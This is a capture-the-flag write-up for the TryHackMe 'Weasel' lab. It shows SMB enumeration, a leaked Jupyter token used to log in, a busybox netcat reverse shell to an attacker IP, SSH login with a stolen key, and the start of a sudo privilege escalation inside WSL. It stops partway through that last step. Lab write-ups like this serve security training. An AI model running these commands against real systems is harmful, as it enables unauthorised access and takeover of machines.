<h3> Weasel TryHackMe </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d75505c1-e2ce-4fb1-b86f-fe0818711009)

Nmap Scan:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8e462a6e-01d5-48fc-bc64-c5fe47d96a15)

From the scan we can tell that this is a windows box 

Let's enumerate smb first

Checking the shares available shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/26c7facd-82f4-4d00-8311-461dfd8143db)

Now we can mount the *datasci-team* share
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/444afca1-a3cb-4896-a042-04ad8d917a25)

```
Command: sudo mount -t cifs -o username=guest,password= //10.10.195.131/datasci-team mount
```

After i looked through the smb folders in that share i didn't see anything interesting except this jupyter token
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5ba4420f-bd7d-455d-b7ee-95cb4e73fdc8)

We can now unmount it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5d1dd99e-5400-4c0c-82a5-a108061808f0)

```
Command: sudo umount mount
```

Back to the port 8888 shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e4664709-f541-4726-897e-fe03b3c6abcd)

This is an instance of jupyter and it's running on port 8888

It requies a token to get logged in

Remember we got a token from the smb so using it here works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/62df165e-d12d-4d19-9ede-7314f75b361a)

```
Token: 067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
```

To get shell on jupyter is very easy since it usually have a python interactive instance and also a terminal 

But let's go with the terminal option

Click on the *new button* then click the *terminal button*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7fc0bd07-3196-4a6d-9bd6-6695bc41e21f)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4958278f-f2f6-458a-b39c-f48fed665167)

I just got a reverse shell using *busybox* binary
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/43e343d2-1f66-49b3-9fb4-0199593dc0f8)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/64553ac3-75c2-4d97-8338-41d227cb7b19)

```
Command: busybox nc 10.2.42.156 1337 -e /bin/bash
```

From here we see that this is a linux host

But our nmap scan showed that this is a windows box 

So the only thing we can think of is that this is a host running [wsl](https://learn.microsoft.com/en-us/windows/wsl/install)

Looking at the current working directory we can see a ssh key for user *dev-datasci-lowpriv*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f8c7c1ed-34b8-4272-86bb-c2aa9a8d287b)

We can try login to ssh cause it works 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3eb644cd-c349-4dac-be61-9fe268d47bf5)

```
Command:-
chmod 600 id_rsa
ssh -i id_rsa dev-datasci-lowpriv@10.10.195.131
```

Let's see if we can root the wsl host because if that works we can just mount the windows host and access the administrator directory 

Also i'm taking this path cause i suck at privesc in windows 😄

Checking *sudo* permission on the wsl shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/843301ef-3f6b-44ac-afb8-2dbe2cb16308)

Interesting we can run */home/dev-datasci/.local/bin/jupyter* as root that looks to easy already 🙂

But trying it doesn't work
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e06c24fe-f20f-4532-99bf-4c1f25d3d0c8)

We get *command not found* and that is because the binary isn't in that specific path smh

I used *find* command then got the binary
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0f7909af-3e5e-4cac-b62f-5b56d05be07b)

```
Command: find / -type f -name jupyter 2>/dev/null
```

Now we can just copy the binary to that path since we have write access *cause /home/dev-datasci/.local* is owned by us
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/761d9d35-f591-4dac-8aed-f3cca7cfc6db)

```
Command: cp /home/dev-datasci/anaconda3/bin/jupyter /home/dev-datasci/.local/bin/jupyter
```
